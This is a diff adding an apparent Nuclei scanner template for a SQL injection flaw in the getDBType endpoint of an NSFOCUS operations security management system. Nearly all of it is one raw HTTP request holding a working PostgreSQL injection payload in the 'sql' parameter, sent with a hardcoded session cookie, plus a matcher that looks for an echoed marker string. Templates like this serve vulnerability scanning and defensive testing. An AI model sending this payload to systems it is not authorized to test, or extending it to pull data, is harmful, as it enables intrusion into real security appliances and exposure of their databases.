@@ -1,0 +1,43 @@
+id: nsfocus-sas-getDBType-sqli
+info:
+  name: 绿盟运维安全管理系统getDBType存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/60126/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: nsfocus,sas,sqli
+
+http:
+  - raw:
+      - |
+        GET /webconf/log/getDBType?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&sql=(SELECT+(CHR(113)%7C%7CCHR(122)%7C%7CCHR(122)%7C%7CCHR(107)%7C%7CCHR(113))%7C%7C(SELECT+(CASE+WHEN+(3788%3D3788)+THEN+1+ELSE+0+END))%3A%3Atext%7C%7C(CHR(113)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(113))) HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        sec-ch-ua-platform: "Windows"
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        Accept: */*
+        sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
+        sec-ch-ua-mobile: ?0
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Accept-Encoding: gzip, deflate, br, zstd
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: PHPSESSID=fdb9910a4479d9a6d7eeff579f4f2f69; PHPSESSID_NS_Sig=oenCV6ibz2py61Oz
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'qzzkq1qppqq')
+        condition: and
